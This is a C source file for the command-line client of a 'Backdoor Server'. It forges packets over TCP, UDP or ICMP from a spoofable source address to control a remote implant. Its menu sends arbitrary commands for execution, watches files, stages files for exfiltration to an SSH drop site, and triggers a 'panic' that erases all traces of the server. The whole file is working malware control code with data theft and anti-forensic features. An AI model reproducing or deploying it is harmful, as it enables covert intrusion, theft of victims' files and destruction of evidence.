/*-----------------------------------------------------------------------------
 * client.c - Client to Backdoor Server
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "client.h"
#include "ssh_utils.h"
#include "packet_utils.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    main 
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   int main(int argc, char **argv)
 *                  argc - argument count
 *                  argv - array of arguments
 * 
 * RETURNS:     Result on success or failure.
 *
 * NOTES: Main entry point into the program. Parses command-line arguments and
 *        configures the client.
 *----------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	pthread_t thread_cli;
	int tret_cli;

	/* parse CLI options */
	if (parse_options(argc, argv) == ERROR_OPTS) {
		err(1, "Invalid options");
	}

	print_settings(argv[0]);

	/* make sure user is root */
	if (geteuid() != USER_ROOT) {
		fprintf(stderr, "Must be root to run this program.\n");
		exit(ERROR_NOTROOT);
	}

	/* raise privileges */
	if (setuid(0) != SUCCESS || setgid(0) != SUCCESS) {
		err(1, "raise privileges");
	}

	/* start packet capture thread */
	server = FALSE;
	tret_cli = pthread_create(&thread_cli, NULL, pcap_start, (void *)NULL);

	/* allow the pcap interface time to initialize */
	sleep(1);

	cli_interface();

	return SUCCESS;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_settings
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_settings(char *command)
 *                   command - the program's name
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the current settings that are being used in the current
 *        run of the application.
 *----------------------------------------------------------------------------*/void print_settings(char *command)
{
	fprintf(stderr, "Using the Following Options: (For help use \"%s -h\")\n", command);
	fprintf(stderr, "  Server's IP address:     %s\n", cli_vars.server_ip);

	switch (cli_vars.protocol) {
		case PROTO_TCP:
			fprintf(stderr, "  Communications Protocol: TCP\n");
			break;
		case PROTO_UDP:
			fprintf(stderr, "  Communications Protocol: UDP\n");
			break;
		case PROTO_ICMP:
			fprintf(stderr, "  Communications Protocol: ICMP\n");
			break;
	}
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_usage
 * 
 * DATE:        May 18, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_usage(char *command, int err)
 *                   command - the program's name
 *                   err - error produced
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the program's useage information if the user incorrectly
 *        entered an option or used the -h or --help option.
 *----------------------------------------------------------------------------*/
void print_usage(char *command, int err)
{
    if (err == ERROR_OPTS_HELP) {
        fprintf(stderr, "usage: %s [arguments]\n\n", command);
        fprintf(stderr, "Arguments:\n");
        fprintf(stderr, "  -s       or  --server        Server's IP address\n");
        fprintf(stderr, "  -c       or  --client        Client's IP address (spoofable)\n");
        fprintf(stderr, "  -p       or  --protocol      Protocol to use [TCP | UDP | ICMP]\n");
        fprintf(stderr, "  -h       or  --help          Prints out this screen\n");
		exit(ERROR_OPTS_HELP);
    }
	else if (err == ERROR_OPTS)
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
	else {
        fprintf(stderr, "%s: unknown error\n", command);
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
    }	

}

/*-----------------------------------------------------------------------------
 * FUNCTION:    parse_options 
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   parse_options(int argc, char *argv[])
 *                    argc - argument count
 *                    argv - argument list
 * 
 * RETURNS:     ERROR_NONE on success ERROR_OPTS on failure.
 * 
 * NOTES: Sets default options and parses any command-line options.
 *----------------------------------------------------------------------------*/
int parse_options(int argc, char *argv[])
{
	int c, option_index = 0;

	static struct option long_options[] =
	{
		{"server"		, required_argument	, 0, 's'},
		{"client"		, required_argument	, 0, 'c'},
		{"protocol"		, required_argument	, 0, 'p'},
		{"help"			, no_argument		, 0, 'h'},
		{0, 0, 0, 0}
	};

	if (argc != 7)
		print_usage(argv[0], ERROR_OPTS_HELP);

	/* parse options */
	while (TRUE) {
		c = getopt_long(argc, argv, "s:c:p:h", long_options, &option_index);

		if (c == -1)
			break;

		switch (c) {
			case 0:
				if (long_options[option_index].flag != 0)
					break;
				break;

			case 's':
				cli_vars.server_ip = optarg;
				break;

			case 'c':
				cli_vars.source_ip = optarg;
				break;

			case 'p':
				if (!strncmp(optarg, "TCP", strlen(optarg)))
					cli_vars.protocol = PROTO_TCP;
				else if (!strncmp(optarg, "UDP", strlen(optarg)))
					cli_vars.protocol = PROTO_UDP;
				else if (!strncmp(optarg, "ICMP", strlen(optarg)))
					cli_vars.protocol = PROTO_ICMP;
				else
					print_usage(argv[0], ERROR_OPTS_HELP);
				break;

			case 'h':
				print_usage(argv[0], ERROR_OPTS_HELP);
				break;			

			default:
				print_usage(argv[0], ERROR_OPTS);
				return ERROR_OPTS;
				break;
		}
	}

	return SUCCESS;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_interface
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_interface(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Initiates the command-line interface for interaction with the client.
 *----------------------------------------------------------------------------*/
void cli_interface(void)
{
	int bytes_read;
	size_t nbytes = 1024;
	char *input = (char *)malloc(nbytes + 1);

	fprintf(stderr, "\nInitiating interactive shell. Type ? for help.\n");
	fprintf(stderr, "==============================================\n");
	fprintf(stderr, "> ");

	while ((bytes_read = getline(&input, &nbytes, stdin))) {
		if (!strncmp(input, "?\n", strlen(input)))
			cli_help();
		else if (!strncmp(input, "help\n", strlen(input)))
			cli_help();
		else if (!strncmp(input, "quit\n", strlen(input)))
			exit(SUCCESS);
		else if (!strncmp(input, "squit\n", strlen(input))) {
				fprintf(stderr, "Quitting server...\n");
				packet_forge(QUIT_CMD, cli_vars.source_ip, cli_vars.server_ip);
		}
		else if (!strncmp(input, "panic\n", strlen(input))) {
				fprintf(stderr, "Panic quitting server...\n");
				packet_forge(PANIC_CMD, cli_vars.source_ip, cli_vars.server_ip);
		}
		else if (!strncmp(input, "command\n", strlen(input)))
			cli_command();
		else if (!strncmp(input, "watch\n", strlen(input)))
			cli_watch();
		else if (!strncmp(input, "getfile\n", strlen(input)))
			cli_getfile();
		else if (!strncmp(input, "droplist\n", strlen(input)))
			ssh_dropsite_list();
		else if (!strncmp(input, "dropget\n", strlen(input)))
			cli_dropget();
		else if (!strncmp(input, "dropdel\n", strlen(input)))
			cli_dropdel();
		else if (!strncmp(input, "dropclear\n", strlen(input)))
			ssh_dropsite_clear();

		fprintf(stderr, "> ");
	}

	free(input);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_command
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_command(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Sends the command to be executed on the server.
 *----------------------------------------------------------------------------*/
void cli_command(void)
{
	int bytes_read;
	size_t nbytes = 1024;
	char *input = (char *)malloc(nbytes + 1);
	char *command = (char *)malloc(nbytes + 1);
	char *packet = (char *)malloc(nbytes + 1);

	fprintf(stderr, "enter command > ");

	bytes_read = getline(&input, &nbytes, stdin);

	if (!strncmp(input, "\n", strlen(input)))
		return;
	else {
		memset(command, 0x00, nbytes + 1);
		memcpy(command, input, strlen(input) - 1);
		fprintf(stderr, "Sending to server...\n");

		/* send command */
		memset(packet, 0x00, nbytes + 1);
		sprintf(packet, "%s%s%s", EXT_CMD_START, command, EXT_CMD_END);
		packet_forge(packet, cli_vars.source_ip, cli_vars.server_ip);
	}

	free(input);
	free(packet);
	free(command);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_watch
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_watch(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Instructs the server to watch the specified file/directory for changes
 *        using inotify. Upon any change, the file is sent to the dropsite.
 *----------------------------------------------------------------------------*/
void cli_watch(void)
{
	int bytes_read;
	size_t nbytes = 1024;
	char *input = (char *)malloc(nbytes + 1);
	char *command = (char *)malloc(nbytes + 1);
	char *packet = (char *)malloc(nbytes + 1);

	fprintf(stderr, "enter file or directory > ");

	bytes_read = getline(&input, &nbytes, stdin);

	if (!strncmp(input, "\n", strlen(input)))
		return;
	else {
		memset(command, 0x00, nbytes + 1);
		memcpy(command, input, strlen(input) - 1);
		fprintf(stderr, "Sending to server...\n");
		
		memset(packet, 0x00, nbytes + 1);
		sprintf(packet, "%s%s%s", WATCH_CMD_START, command, WATCH_CMD_END);
		packet_forge(packet, cli_vars.source_ip, cli_vars.server_ip);
	}

	free(input);
	free(packet);
	free(command);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_getfile
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_getfile(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Instructs the server to send the specified file to the dropsite.
 *----------------------------------------------------------------------------*/
void cli_getfile(void)
{
	int bytes_read;
	size_t nbytes = 1024;
	char *input = (char *)malloc(nbytes + 1);
	char *file_name = (char *)malloc(nbytes + 1);
	char *packet = (char *)malloc(nbytes + 1);

	fprintf(stderr, "enter file > ");

	bytes_read = getline(&input, &nbytes, stdin);

	if (!strncmp(input, "\n", strlen(input)))
		return;
	else {
		memset(file_name, 0x00, nbytes + 1);
		memcpy(file_name, input, strlen(input) - 1);

		memset(packet, 0x00, nbytes + 1);
		sprintf(packet, "%sln -sf %s %s%s", EXT_CMD_START, file_name,
				SYMLINK_DIR, EXT_CMD_END);
		packet_forge(packet, cli_vars.source_ip, cli_vars.server_ip);

		fprintf(stderr, "File queued for transfer to dropsite...\n");
	}

	free(input);
	free(packet);
	free(file_name);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_dropget
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_dropget(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Retrieves the specified file from the dropsite.
 *----------------------------------------------------------------------------*/
void cli_dropget(void)
{
	int bytes_read;
	size_t nbytes = 1024;
	char *input = (char *)malloc(nbytes + 1);
	char *file_name = (char *)malloc(nbytes + 1);

	fprintf(stderr, "enter file > ");

	bytes_read = getline(&input, &nbytes, stdin);

	if (!strncmp(input, "\n", strlen(input)))
		return;
	else {
		memset(file_name, 0x00, nbytes + 1);
		memcpy(file_name, input, strlen(input) - 1);
		ssh_dropsite_get(file_name);
	}

	free(input);
	free(file_name);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_dropdel
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_dropdel(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Deletes the specified file from the dropsite.
 *----------------------------------------------------------------------------*/
void cli_dropdel(void)
{
	int bytes_read;
	size_t nbytes = 1024;
	char *input = (char *)malloc(nbytes + 1);
	char *file_name = (char *)malloc(nbytes + 1);

	fprintf(stderr, "enter file > ");

	bytes_read = getline(&input, &nbytes, stdin);

	if (!strncmp(file_name, "\n", strlen(input)))
		return;
	else {
		memset(file_name, 0x00, nbytes + 1);
		memcpy(file_name, input, strlen(input) - 1);
		ssh_dropsite_delete(file_name);
	}

	free(input);
	free(file_name);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    cli_help
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void cli_help(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Prints out command list and descriptions.
 *----------------------------------------------------------------------------*/
void cli_help(void)
{
	fprintf(stderr, "  Command List:\n");
	fprintf(stderr, "  ============================================================\n");
	fprintf(stderr, "  ?          Print out this list\n");
	fprintf(stderr, "  help       Print out this list\n");
	fprintf(stderr, "  quit       Exit the client\n");
	fprintf(stderr, "  squit      Terminates the server\n");
	fprintf(stderr, "  panic      Deletes all traces of server and terminates\n");
	fprintf(stderr, "  command    Enter a command for the server to execut.\n");
	fprintf(stderr, "  watch      Enter a file or directory to monitor.\n");
	fprintf(stderr, "  getfile    Enter a file to transfer from server to drop site\n");
	fprintf(stderr, "  droplist   Lists files on the drop site\n");
	fprintf(stderr, "  dropget    Enter a file to get from the drop site\n");
	fprintf(stderr, "  dropdel    Enter a file to delete from the drop site\n");
	fprintf(stderr, "  dropclear  Deletes ALL files from the drop site\n");
}
